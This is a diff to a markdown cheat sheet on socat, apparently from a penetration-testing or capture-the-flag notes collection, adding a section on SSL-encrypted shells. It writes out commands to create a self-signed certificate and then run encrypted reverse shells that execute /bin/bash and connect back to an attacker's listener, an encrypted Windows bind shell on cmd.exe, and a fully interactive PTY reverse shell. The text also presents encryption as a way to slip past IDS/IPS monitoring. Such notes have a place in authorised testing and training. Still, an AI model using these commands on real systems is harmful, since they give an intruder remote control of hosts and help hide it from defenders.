@@ -60,9 +60,62 @@ socat TCP-LISTEN:8080,fork TCP:$TARGET:80
 socat TCP-LISTEN:8888,fork TCP:internal-host:8080
 ```
 
-### TLS-wrap an unencrypted listener
+### SSL-Encrypted Shells
+
+One of the great things about socat is that it's capable of creating **encrypted shells** — both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass IDS/IPS as a result.
+
+Any time `TCP` was used as part of a command, replace it with `OPENSSL` to get an encrypted equivalent.
+
+#### 1. Generate the certificate (on the attacking machine)
+
 ```bash
-socat OPENSSL-LISTEN:8443,cert=cert.pem,key=key.pem,verify=0,fork TCP:127.0.0.1:8080
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+
+This creates a 2048-bit key with a matching self-signed certificate, valid for just under a year. The fields it prompts for can be left blank or filled randomly.
+
+Merge both files into a single `.pem`:
+
+```bash
+cat shell.key shell.crt > shell.pem
+```
+
+> **Note:** The certificate must always be used on the **listening** side — attacker for reverse shells, target for bind shells.
+
+#### 2. Reverse shell (encrypted)
+
+```bash
+# Attacker — listener
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+# Target — connect back
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+
+`verify=0` tells socat not to validate that the certificate is properly signed by a recognised authority (self-signed is fine).
+
+#### 3. Bind shell (encrypted)
+
+```bash
+# Target — listener (cert must be here)
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+# Attacker — connect
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+```
+
+For a Windows bind shell, copy the `.pem` file to the target before running the listener.
+
+#### 4. Stable PTY reverse shell (encrypted)
+
+Combine OpenSSL transport with full PTY flags for a fully interactive encrypted shell:
+
+```bash
+# Attacker
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
+
+# Target
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
 ### Plain proxy (UDP / mixed)
@@ -102,5 +155,3 @@ socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:8080      # UNIX <-> TCP bridge
 - [python-input-injection.md](../../exploits/web-rce/python-input-injection.md) -- bsidesgtdevelpy's `EXEC:` foothold
 - [ssh-tunneling.md](../../techniques/pivot/ssh-tunneling.md) -- when SSH access is also available
 - [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md) -- one of the static binaries you'd want inside a container
-
-
